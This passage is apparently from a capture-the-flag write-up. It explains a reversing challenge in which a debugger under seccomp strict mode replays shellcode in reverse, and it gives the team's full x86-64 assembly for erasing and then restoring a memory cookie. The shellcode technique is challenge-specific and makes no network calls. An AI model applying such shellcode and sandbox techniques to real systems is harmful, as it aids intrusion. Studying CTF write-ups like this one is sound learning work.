every possible syscall but read, write, exit, and sigreturn, as mentioned in the
man:

> The only system calls that the calling thread is permitted to make are
> read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2)

We also found that it initialized a both readable and writable mapping at
address `0x2170000` to `0x2171000`. Our shellcode started from address
`0xdead0080` and needed to be less than 2KB.

### The time_machine debugger

We started reversing this binary, we soon realized that it was a debugger
executing whatever it's passed through as a first argument (Our generated ELF).
Our shellcode was executed step by step saving in a list every executed
instruction address. Once it got to a SYSCALL instruction it checked whether the
EAX register was set to 0x3C (sys_exit) and, if so, it started executing every
instruction stored in the list in reversed order. The syscall (or sysenter)
instructions were completely ignored and even if we got one we couldn't execute
almost anything because of the seccomp. The debugger, once started, also sets an
8byte cookie to `0x2170000`, checks if it's cleared once our shellcode is
executed and rechecks if it's there once it got executed the other way back.

### The shellcode

So the challenge was: write down an assembly that could erase the cookie when
executed in the normal way and could restore it when executed with the same flow
but reversed. Our first tought was to store it into a register and xor it to
memory in a way that looked like this:

```
mov rcx, 0x2170000
mov rdx, 0x0     ; Clean rdx
xor rdx, [rcx]   ; Set/erase rdx
xor [rcx], rdx   ; Erase/set memory
mov rcx, 0x2170000
mov eax, 0x3c
syscall
```

Of course, it wasn't that simple, the registers (both the CPU and FP ones) got
erased right before the reversed execution, we needed somewhere else to store
the cookie. The stack? No, we couldn't have a stack address in the reversed
execution. The rest of the ```0x2170000``` mapping? No, this debugger checked
also that the entire page was NULL(ed). But then we realized that we actually
had a memory: the executed instruction order! So the final shellcode looked like
this:

```
mov rdx, 0x2170000 ; initialize rdx to cookie address
mov rsp, 0x2170500 ; improvised stack to store ret values

mov rcx, rdx
add rcx, 0
call confrontoLow ; confronto == compare
add rcx, 0
mov rcx, rdx
add rcx, 0
call confrontoHigh
add rcx, 0

mov rcx, rdx

add rcx, 1
call confrontoLow
add rcx, 1
mov rcx, rdx
add rcx, 1
call confrontoHigh
add rcx, 1

mov rcx, rdx
    .
    . ; Replicated code for every nibble possible value
    .
add rcx, 15 ; While coding at 4am, we didn't realized that up to 7 was enough, we copied more than needed(16 bytes)
call confrontoLow
add rcx, 15
mov rcx, rdx
add rcx, 15
call confrontoHigh
add rcx, 15


push 0 ; clean improvised stack
; reset a bunch of things just to be sure
mov rsp, 0x2170500
mov rdx, 0x2170000
mov rcx, 0x2170500
xor rdx,rdx
xor rbx,rbx
xor rcx,rcx
xor r14,r14
; Or should I comment here? Whatever...
mov rax, 0x3c
syscall


; Check the upper nibble and jump to the calculated function offset
confrontoHigh:
xor rbx,rbx
mov bl, byte ptr[rcx]
shr bl, 4
mov r14, 0xdead035b ; absolute for nibble00High
add r14, rbx        ; multiply by 8 for lazy people
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
jmp r14


; Check the lower nibble and jump to the calculated function offset
confrontoLow:
xor rbx,rbx
mov bl, byte ptr[rcx]
and bl, 0xf
mov r14, 0xdead030b ; absolute for nibble00Low
add r14, rbx        ; multiply by 5 for lazy people
add r14, rbx
add r14, rbx
add r14, rbx
add r14, rbx
jmp r14


nibble00Low:
xor qword ptr [rcx],0x00
ret

nibble01:
xor qword ptr [rcx],0x01
ret
    .
    .
    .
nibble0f:
xor qword ptr [rcx],0x0f
ret


nibble00High:
xor qword ptr [rcx],0x00
ret
nop  ; Needed a 3 byte offset because xor with immediate ≤0x7f is smaller than the other half byte (Wtf x64 assembly?)
nop
nop

nibble10:
xor qword ptr [rcx],0x10
ret
nop
nop
nop
    .
    .
    .
nibble70:
xor qword ptr [rcx],0x70
ret
nop
nop
nop

nibble80:
xor qword ptr [rcx],0x80
ret
    .
    .
    .
nibblef0:
xor qword ptr [rcx],0xf0
ret
```

And the flow does the rest... When it goes back it initializes a register at the
right byte address and the flow 'remembers' which value every nibble had by
executing the code segment containing the xor with that value.

### Conclusion

We could, as we had seen from the solution, have used bits instead of nibbles
but hey! At least we didn't use bytes! Also, during our journey, we thought we
could use some floating-point register but we had seen that this wasn't the case
because those got erased too. (Turns out we were wrong because the xmm registers
did got erased, while the ymm registers didn't get erased)
